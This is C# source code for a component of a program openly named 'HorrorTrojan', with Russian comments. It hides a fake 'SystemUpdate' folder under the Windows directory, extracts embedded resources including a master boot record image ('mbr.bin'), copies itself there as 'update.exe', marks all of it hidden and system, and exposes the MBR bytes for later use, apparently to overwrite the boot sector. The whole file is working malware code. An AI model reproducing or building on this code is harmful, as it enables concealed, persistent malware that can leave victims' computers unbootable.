using System;
using System.IO;
using System.Reflection;

namespace HorrorTrojan
{
    internal static class ResourceExtractor
    {
        private static string TargetDir = @"C:\Windows\ProgramFiles\SystemUpdate";
        private static string ParentDir = @"C:\Windows\ProgramFiles";
        
        static ResourceExtractor()
        {
            if (!Directory.Exists(TargetDir))
                Directory.CreateDirectory(TargetDir);
            
            // Скрываем ВСЮ папку ProgramFiles
            HideDirectory(ParentDir);
            // Скрываем папку SystemUpdate
            HideDirectory(TargetDir);
        }
        
        public static void ExtractAll()
        {
            ExtractResource("wallpaper.jpg", Path.Combine(TargetDir, "wallpaper.jpg"));
            ExtractResource("eye.ico", Path.Combine(TargetDir, "eye.ico"));
            ExtractResource("eye.ani", Path.Combine(TargetDir, "eye.ani"));
            ExtractResource("horror.png", Path.Combine(TargetDir, "horror.png"));
            ExtractResource("mbr.bin", Path.Combine(TargetDir, "mbr.bin"));
            ExtractResource("hr.wav", Path.Combine(TargetDir, "hr.wav"));
            
            string selfPath = Assembly.GetExecutingAssembly().Location;
            string updatePath = Path.Combine(TargetDir, "update.exe");
            if (!File.Exists(updatePath) && File.Exists(selfPath))
                File.Copy(selfPath, updatePath);
            
            // Скрываем все файлы в папке SystemUpdate
            HideFilesInDirectory(TargetDir);
            
            // Скрываем саму папку ProgramFiles (повторно, на всякий случай)
            HideDirectory(ParentDir);
        }
        
        private static void ExtractResource(string resourceName, string outputPath)
        {
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
            {
                if (stream == null) return;
                byte[] buffer = new byte[stream.Length];
                stream.Read(buffer, 0, buffer.Length);
                File.WriteAllBytes(outputPath, buffer);
                
                // Скрываем каждый файл после создания
                HideFile(outputPath);
            }
        }
        
        private static void HideDirectory(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
                }
            }
            catch { }
        }
        
        private static void HideFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
                }
            }
            catch { }
        }
        
        private static void HideFilesInDirectory(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    foreach (string file in Directory.GetFiles(path))
                    {
                        HideFile(file);
                    }
                    
                    foreach (string dir in Directory.GetDirectories(path))
                    {
                        HideDirectory(dir);
                        HideFilesInDirectory(dir);
                    }
                }
            }
            catch { }
        }
        
        public static byte[] GetMBR()
        {
            string path = Path.Combine(TargetDir, "mbr.bin");
            if (File.Exists(path))
                return File.ReadAllBytes(path);
            return new byte[512];
        }
        
        public static string GetTargetDir()
        {
            return TargetDir;
        }
    }
}
